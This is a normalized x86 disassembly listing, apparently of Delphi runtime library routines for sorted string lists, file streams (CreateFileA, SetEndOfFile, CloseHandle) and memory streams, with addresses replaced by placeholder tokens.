cmp edi [ ebx + 0x1c ]
jl r-xdata
test edi edi
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov ecx edi
mov edx esi
mov eax ebx
call sub_41b248
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop edi
pop esi
pop ebx
retn
sub_41b248
push ebx
mov ebx [ eax + 0x18 ]
lea edx [ ebx + edx * 8 ]
mov eax [ eax + 0x18 ]
lea eax [ eax + ecx * 8 ]
mov ecx [ edx ]
mov ebx [ eax ]
mov [ edx ] ebx
mov [ eax ] ecx
mov ecx [ edx + 0x4 ]
mov ebx [ eax + 0x4 ]
mov [ edx + 0x4 ] ebx
mov [ eax + 0x4 ] ecx
pop ebx
retn
sub_41b26c
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov edi eax
mov [ esp + 0x8 ] 0x0
xor esi esi
mov eax [ edi + 0x1c ]
dec eax
mov [ esp + 0xc ] eax
cmp esi [ esp + 0xc ]
jg r-xdata
mov eax [ esp + 0x4 ]
mov [ eax ] esi
movzx eax [ esp + 0x8 ]
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebx [ esp + 0xc ]
add ebx esi
shr ebx 0x1
mov eax [ edi + 0x18 ]
mov edx [ eax + ebx * 8 ]
mov ecx [ esp ]
mov eax edi
mov ebp [ eax ]
call [ ebp + 0x34 ]
mov [ esp + 0x10 ] eax
cmp [ esp + 0x10 ] 0x0
jge r-xdata
mov eax ebx
dec eax
mov [ esp + 0xc ] eax
cmp [ esp + 0x10 ] 0x0
jne r-xdata
lea esi [ ebx + 0x1 ]
jmp r-xdata
cmp esi [ esp + 0xc ]
jle r-xdata
mov [ esp + 0x8 ] 0x1
cmp [ edi + 0x25 ] 0x1
je r-xdata
mov esi ebx
sub_41b2f0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_41a4c0
cmp esi [ ebx + 0x1c ]
jl r-xdata
mov eax edi
mov edx [ ebx + 0x18 ]
mov edx [ edx + esi * 8 ]
call sub_405584
pop edi
pop esi
pop ebx
retn
sub_41b32c
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_41a4c0
cmp esi [ ebx + 0x1c ]
jl r-xdata
mov eax [ ebx + 0x18 ]
mov eax [ eax + esi * 8 + 0x4 ]
pop esi
pop ebx
retn
sub_41b354
push esi
mov edx [ eax + 0x20 ]
cmp edx 0x40
jle r-xdata
cmp edx 0x8
jle r-xdata
mov esi edx
test esi esi
jns r-xdata
mov esi 0x4
mov esi 0x10
jmp r-xdata
sar esi 0x2
jmp r-xdata
add esi 0x3
add esi edx
mov edx esi
mov ecx [ eax ]
call [ ecx + 0x28 ]
pop esi
retn
sub_41b388
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x24 ] 0x0
jne r-xdata
mov ecx esp
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x8c ]
test al al
jne r-xdata
mov edx esi
mov eax ebx
call sub_41a79c
mov [ esp ] eax
jmp r-xdata
mov eax [ esp ]
pop edx
pop esi
pop ebx
retn
mov [ esp ] 0xffffffff
sub_41b3d4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x24 ] 0x0
je r-xdata
test esi esi
jl r-xdata
mov edx [ rw-data ]
xor ecx ecx
mov eax ebx
call sub_41a4c0
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_41a4c0
cmp esi [ ebx + 0x1c ]
jle r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x88 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_41b428
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x1c ]
cmp eax [ ebx + 0x20 ]
jne r-xdata
mov eax [ ebx + 0x1c ]
cmp esi eax
jge r-xdata
mov eax ebx
call sub_41b354
mov eax [ ebx + 0x18 ]
lea eax [ eax + esi * 8 ]
mov esi eax
xor eax eax
mov [ esi ] eax
mov eax [ ebp + 0x8 ]
mov [ esi + 0x4 ] eax
mov eax esi
mov edx edi
call sub_405584
inc [ ebx + 0x1c ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov edx [ ebx + 0x18 ]
lea edx [ edx + esi * 8 + 0x8 ]
push edx
mov edx [ ebx + 0x18 ]
lea edx [ edx + esi * 8 ]
sub eax esi
mov ecx eax
add ecx ecx
add ecx ecx
add ecx ecx
mov eax edx
pop edx
call sub_4030fc
sub_41b4a4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x24 ] 0x0
je r-xdata
test esi esi
jl r-xdata
mov edx [ rw-data ]
xor ecx ecx
mov eax ebx
call sub_41a4c0
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_41a4c0
cmp esi [ ebx + 0x1c ]
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x18 ]
lea eax [ eax + esi * 8 ]
mov edx edi
call sub_405584
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop edi
pop esi
pop ebx
retn
sub_41b500
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_41a4c0
cmp esi [ ebx + 0x1c ]
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x18 ]
mov [ eax + esi * 8 + 0x4 ] edi
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop edi
pop esi
pop ebx
retn
sub_41b540
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call [ ebp + 0x8 ]
test eax eax
jl r-xdata
inc ebx
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call [ ebp + 0x8 ]
test eax eax
jg r-xdata
dec esi
cmp esi ebx
jl r-xdata
cmp esi ebx
jge r-xdata
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41b248
cmp ebx [ ebp - 0x10 ]
jne r-xdata
cmp esi [ ebp - 0x8 ]
jle r-xdata
cmp esi [ ebp - 0x10 ]
jne r-xdata
mov [ ebp - 0x10 ] esi
jmp r-xdata
mov [ ebp - 0x8 ] ebx
cmp ebx [ ebp - 0xc ]
jl r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41b540
inc ebx
dec esi
mov [ ebp - 0x10 ] ebx
mov ebx [ ebp - 0x8 ]
mov esi [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
add eax [ ebp - 0xc ]
shr eax 0x1
mov [ ebp - 0x10 ] eax
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_41b5d4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
add edx edx
add edx edx
add edx edx
lea eax [ ebx + 0x18 ]
call sub_402f34
mov [ ebx + 0x20 ] esi
pop esi
pop ebx
retn
sub_41b5f0
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x24 ]
je r-xdata
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov [ esi + 0x24 ] bl
mov eax esi
mov edx [ eax ]
call [ edx + 0x90 ]
sub_41b628
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0x18 ]
mov ecx [ eax + ecx * 8 ]
mov eax [ esi + 0x18 ]
mov edx [ eax + edi * 8 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x34 ]
pop edi
pop esi
pop ebx
retn
sub_41b658
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x24 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x1c ] 0x1
jle r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
push esi
mov ecx [ ebx + 0x1c ]
dec ecx
xor edx edx
mov eax ebx
call sub_41b540
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
sub_41b690
push ebx
push esi
push edi
push ebp
mov ebp ecx
mov edi edx
cmp [ eax + 0x26 ] 0x0
je r-xdata
mov ebx edi
test ebx ebx
je r-xdata
mov ebx edi
test ebx ebx
je r-xdata
mov esi ebp
test esi esi
je r-xdata
sub ebx 0x4
mov ebx [ ebx ]
mov esi ebp
test esi esi
je r-xdata
sub ebx 0x4
mov ebx [ ebx ]
push esi
mov eax ebp
call sub_4059dc
push eax
push ebx
mov eax edi
call sub_4059dc
push eax
push 0x1
push 0x400
call CompareStringA
sub eax 0x2
sub esi 0x4
mov esi [ esi ]
push esi
mov eax ebp
call sub_4059dc
push eax
push ebx
mov eax edi
call sub_4059dc
push eax
push 0x0
push 0x400
call CompareStringA
sub eax 0x2
jmp r-xdata
sub esi 0x4
mov esi [ esi ]
pop ebp
pop edi
pop esi
pop ebx
retn
sub_41b714
add esp 0xfffffff8
push 0x0
push 0x0
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ esp ] eax
mov [ esp + 0x4 ] edx
mov eax [ esp ]
mov edx [ esp + 0x4 ]
pop ecx
pop edx
retn
sub_41b748
push ebx
add esp 0xfffffff0
mov ebx eax
push 0x0
push 0x0
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
push 0x0
push 0x0
mov dl 0x2
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ esp ] eax
mov [ esp + 0x4 ] edx
push [ esp + 0xc ]
push [ esp + 0xc ]
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ esp ]
mov edx [ esp + 0x4 ]
add esp 0x10
pop ebx
retn
sub_41b7ac
push ebp
mov ebp esp
mov ecx eax
cmp [ ebp + 0xc ] 0xffffffff
jne r-xdata
jl r-xdata
cmp [ ebp + 0x8 ] 0x80000000
jb r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dbb8
call sub_404ec4
cmp [ ebp + 0xc ] 0x0
jne r-xdata
jmp r-xdata
jle r-xdata
cmp [ ebp + 0x8 ] 0x7fffffff
jbe r-xdata
mov eax [ ebp + 0x8 ]
mov edx eax
mov eax ecx
mov ecx [ eax ]
call [ ecx + 0x4 ]
pop ebp
retn 0x8
jmp r-xdata
sub_41b800
push ebp
mov ebp esp
add esp 0xfffffef8
lea edx [ ebp - 0x108 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
call sub_404530
lea eax [ ebp - 0x108 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x4
lea eax [ ebp - 0x8 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dbf4
call sub_404ec4
mov esp ebp
pop ebp
retn
sub_41b84c
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
mov [ ebp - 0x1a ] cx
mov esi edx
mov [ ebp - 0x4 ] eax
lea ebx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
mov eax [ eax ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
call sub_404528
mov [ ebx ] eax
jmp r-xdata
cmp [ ebx ] 0x0
je r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax [ ebx ]
cmp eax [ r-xdata ]
jne r-xdata
mov [ ebp - 0x14 ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0x18 ]
jne r-xdata
push ebp
call sub_41b800
pop ecx
mov eax [ ebx ]
call sub_4045dc
mov [ ebx ] eax
mov eax esi
cdq
push edx
push eax
movzx edx [ ebp - 0x1a ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push ebp
call sub_41b800
pop ecx
sub_41b8d0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov ebx edx
mov esi eax
cmp [ ebp + 0xc ] 0xffffffff
jne r-xdata
jl r-xdata
cmp [ ebp + 0x8 ] 0x80000000
jb r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dbb8
call sub_404ec4
cmp [ ebp + 0xc ] 0x0
jne r-xdata
jmp r-xdata
jle r-xdata
cmp [ ebp + 0x8 ] 0x7fffffff
jbe r-xdata
mov eax [ ebp + 0x8 ]
mov edx eax
movzx ecx bl
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x14 ]
cdq
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
jmp r-xdata
sub_41b940
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov ecx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0xc ]
cmp ebx eax
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dbb8
call sub_404ec4
sub_41b978
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov ecx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0x10 ]
cmp ebx eax
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dbb8
call sub_404ec4
sub_41b9b0
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov edi edx
mov [ ebp - 0x4 ] eax
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
cmp [ ebp + 0xc ] 0x0
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
jle r-xdata
cmp [ ebp + 0x8 ] 0xf000
jbe r-xdata
push 0x0
push 0x0
mov eax edi
call sub_41b734
mov eax edi
mov edx [ eax ]
call [ edx ]
mov [ ebp + 0x8 ] eax
mov [ ebp + 0xc ] edx
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x14 ] 0xf000
jmp r-xdata
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov eax [ ebp - 0x14 ]
call sub_402f00
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_41ba8c
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov eax [ ebp - 0x14 ]
cdq
cmp edx [ ebp + 0xc ]
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
jge r-xdata
cmp eax [ ebp + 0x8 ]
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ba93
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x18 ]
call sub_402f1c
retn
mov ebx [ ebp + 0x8 ]
mov ebx [ ebp - 0x14 ]
jmp r-xdata
jmp r-xdata
mov esi [ ebp - 0x18 ]
mov edx esi
mov ecx ebx
mov eax edi
call sub_41b940
mov edx esi
mov ecx ebx
mov eax [ ebp - 0x4 ]
call sub_41b978
mov eax ebx
cdq
sub [ ebp + 0x8 ] eax
sbb [ ebp + 0xc ] edx
sub_41baa4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx edx
push 0x1000
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41c388
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_41baf4
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_41e5d0
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41bafb
mov eax [ ebp - 0x8 ]
call sub_404650
retn
sub_41bb04
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_404620
mov [ edi + 0x4 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_404974
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4049cc
pop [ fs : 0x0 ]
add esp 0xc
sub_41bb60
push ebp
mov ebp esp
add esp 0xfffffff8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
and edx 0x7f
mov eax [ eax + 0x4 ]
call sub_40a21c
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop ecx
pop ecx
pop ebp
retn 0x8
sub_41bba0
push ebp
mov ebp esp
push ebx
mov ebx eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ ebx + 0x4 ]
push eax
call SetEndOfFile
call sub_40f310
pop ebx
pop ebp
retn 0x8
sub_41bbc8
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
movzx eax [ ebp + 0x8 ]
push eax
push 0x0
xor edx edx
mov eax esi
call sub_41bc0c
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_404974
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4049cc
pop [ fs : 0x0 ]
add esp 0xc
sub_41bc0c
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x1c ] ebx
test dl dl
je r-xdata
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov edi [ ebp + 0xc ]
xor eax eax
push ebp
push sub_41bd54
push [ fs : eax ]
mov [ fs : eax ] esp
cmp di 0xffff
jne r-xdata
add esp 0xfffffff0
call sub_404974
movzx edx di
mov eax esi
call sub_40a16c
mov ecx eax
xor edx edx
mov eax ebx
call sub_41bb04
cmp [ ebx + 0x4 ] 0x0
jge r-xdata
push 0x0
push 0x80
push 0x2
push 0x0
push 0x0
push 0xc0000000
mov eax esi
call sub_4059dc
push eax
call CreateFileA
mov ecx eax
xor edx edx
mov eax ebx
call sub_41bb04
cmp [ ebx + 0x4 ] 0x0
jge r-xdata
lea eax [ ebx + 0x8 ]
mov edx esi
call sub_405584
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41bd5b
lea eax [ ebp - 0x24 ]
mov edx 0x4
call sub_405554
retn
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_40a70c
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0xb
call GetLastError
lea edx [ ebp - 0x24 ]
call sub_40d2e8
mov eax [ ebp - 0x24 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0x14 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dbf4
call sub_404ec4
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_40a70c
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0xb
call GetLastError
lea edx [ ebp - 0x1c ]
call sub_40d2e8
mov eax [ ebp - 0x1c ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0x14 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dbf4
call sub_404ec4
jmp r-xdata
sub_41bd5b
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
call sub_4049cc
pop [ fs : 0x0 ]
add esp 0xc
sub_41bd80
push ebx
push esi
call sub_404a1c
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
test eax eax
jl r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_404640
test bl bl
jle r-xdata
push eax
call CloseHandle
pop esi
pop ebx
retn
mov eax esi
call sub_4049c4
sub_41bdbc
push ebx
push esi
push edi
mov ebx eax
mov edi [ ebx + 0xc ]
test edi edi
jl r-xdata
xor esi esi
test ecx ecx
jl r-xdata
mov esi [ ebx + 0x8 ]
sub esi edi
test esi esi
jle r-xdata
cmp ecx esi
jge r-xdata
mov eax [ ebx + 0x4 ]
add eax edi
mov ecx esi
call sub_4030fc
add [ ebx + 0xc ] esi
jmp r-xdata
mov esi ecx
mov eax esi
pop edi
pop esi
pop ebx
retn
sub_41bdf4
sub cx 0x1
jb r-xdata
mov [ eax + 0xc ] edx
jmp r-xdata
je r-xdata
mov eax [ eax + 0xc ]
retn
add [ eax + 0xc ] edx
jmp r-xdata
dec cx
je r-xdata
add edx [ eax + 0x8 ]
mov [ eax + 0xc ] edx
jmp r-xdata
sub_41be30
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
push 0xffff
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_41bbc8
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41be7b
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_41be18
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41be82
mov eax [ ebp - 0x4 ]
call sub_404650
retn
sub_41be88
push ebx
push esi
call sub_404a1c
mov ebx edx
mov esi eax
mov eax esi
call sub_41beb4
mov edx ebx
and dl 0xfc
mov eax esi
call sub_404640
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4049c4
sub_41becc
push ebx
push esi
push edi
mov edi edx
mov esi eax
push 0x0
push 0x0
mov eax edi
call sub_41b734
mov eax edi
mov edx [ eax ]
call [ edx ]
mov ebx eax
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x4 ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx [ esi + 0x4 ]
mov ecx ebx
mov eax edi
call sub_41b940
sub_41bf04
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
push 0x20
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_41bbc8
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41bf4c
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_41becc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41bf53
mov eax [ ebp - 0x4 ]
call sub_404650
retn
sub_41bf58
push ebx
push ecx
mov [ esp ] edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov edx eax
mov ecx [ ebx + 0x8 ]
mov eax ebx
call sub_41bdb4
mov eax [ esp ]
mov [ ebx + 0x10 ] eax
pop edx
pop ebx
retn
sub_41bf80
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ ebx + 0xc ]
mov edx esi
mov eax ebx
call sub_41bf58
mov [ ebx + 0x8 ] esi
cmp esi edi
jge r-xdata
pop edi
pop esi
pop ebx
retn
mov cx 0x2
xor edx edx
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x14 ]
sub_41bfac
push ebx
push ecx
mov ebx edx
cmp [ ebx ] 0x0
jle r-xdata
mov edx [ eax + 0x4 ]
mov [ esp ] edx
mov ecx [ ebx ]
mov edx [ eax + 0x10 ]
cmp ecx edx
je r-xdata
mov edx [ ebx ]
cmp edx [ eax + 0x8 ]
je r-xdata
mov eax [ esp ]
pop edx
pop ebx
retn
cmp [ ebx ] 0x0
jne r-xdata
mov edx [ ebx ]
add edx 0x1fff
and edx 0xffffe000
mov [ ebx ] edx
test edx edx
jne r-xdata
mov eax [ eax + 0x4 ]
call sub_402f1c
xor eax eax
mov [ esp ] eax
jmp r-xdata
mov edx [ ebx ]
mov eax esp
call sub_402f34
mov eax [ ebx ]
call sub_402f00
mov [ esp ] eax
jmp r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dbb8
call sub_404ec4
cmp [ esp ] 0x0
jne r-xdata
sub_41c02c
push ebx
push esi
push edi
push ebp
mov esi ecx
mov ebp edx
mov ebx eax
mov eax [ ebx + 0xc ]
test eax eax
jl r-xdata
xor eax eax
test esi esi
jl r-xdata
mov edi eax
add edi esi
test edi edi
jle r-xdata
cmp edi [ ebx + 0x8 ]
jle r-xdata
mov edx [ ebx + 0x4 ]
add edx [ ebx + 0xc ]
mov eax ebp
mov ecx esi
call sub_4030fc
mov [ ebx + 0xc ] edi
mov eax esi
jmp r-xdata
cmp edi [ ebx + 0x10 ]
jle r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ ebx + 0x8 ] edi
mov edx edi
mov eax ebx
call sub_41bf58
sub_41c07c
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_404620
lea eax [ edi + 0x4 ]
mov edx esi
call sub_405584
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_404974
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4049cc
pop [ fs : 0x0 ]
add esp 0xc
sub_41c0c0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
mov esi eax
sub esi [ ebx + 0x8 ]
cmp ecx esi
jge r-xdata
sub eax 0x4
mov eax [ eax ]
lea eax [ ebx + 0x4 ]
call j_sub_4059f0
mov edx [ ebx + 0x8 ]
add eax edx
mov edx edi
mov ecx esi
call sub_4030fc
add [ ebx + 0x8 ] esi
mov eax esi
pop edi
pop esi
pop ebx
retn
mov esi ecx
sub_41c100
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi ecx
mov edx [ ebx + 0x8 ]
add edx esi
lea eax [ ebx + 0x4 ]
call sub_405c6c
lea eax [ ebx + 0x4 ]
call j_sub_4059f0
mov edx [ ebx + 0x8 ]
lea edx [ eax + edx ]
mov eax edi
mov ecx esi
call sub_4030fc
add [ ebx + 0x8 ] esi
mov eax esi
pop edi
pop esi
pop ebx
retn
sub_41c138
push ebx
sub cx 0x1
jb r-xdata
mov [ eax + 0x8 ] edx
jmp r-xdata
je r-xdata
mov ecx [ eax + 0x4 ]
mov edx ecx
test edx edx
je r-xdata
add [ eax + 0x8 ] edx
jmp r-xdata
dec cx
je r-xdata
mov ebx [ eax + 0x8 ]
cmp edx ebx
jge r-xdata
sub edx 0x4
mov edx [ edx ]
mov ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
jmp r-xdata
test ebx ebx
jge r-xdata
mov edx ecx
test edx edx
je r-xdata
sub ecx edx
mov [ eax + 0x8 ] ecx
sub ecx 0x4
mov ecx [ ecx ]
mov eax [ eax + 0x8 ]
pop ebx
retn
xor edx edx
mov [ eax + 0x8 ] edx
mov [ eax + 0x8 ] edx
jmp r-xdata
sub edx 0x4
mov edx [ edx ]
sub_41c198
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov ebx edi
test ebx ebx
je r-xdata
mov eax edi
call sub_4059dc
mov edx eax
mov ecx ebx
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x10 ]
pop edi
pop esi
pop ebx
retn
sub ebx 0x4
mov ebx [ ebx ]
sub_41c1c0
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebx + 0x4 ]
mov edx esi
call sub_405c6c
cmp esi [ ebx + 0x8 ]
jge r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0x8 ] esi
sub_41c1dc
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_404620
mov eax [ ebp + 0x8 ]
push eax
push 0x0
mov eax [ ebp + 0xc ]
call sub_4059dc
mov ecx eax
mov edx esi
mov eax edi
call sub_41c2d4
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_404974
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
call sub_4049cc
pop [ fs : 0x0 ]
add esp 0xc
sub_41c234
push ebp
mov ebp esp
add esp 0xfffffff0
xor eax eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
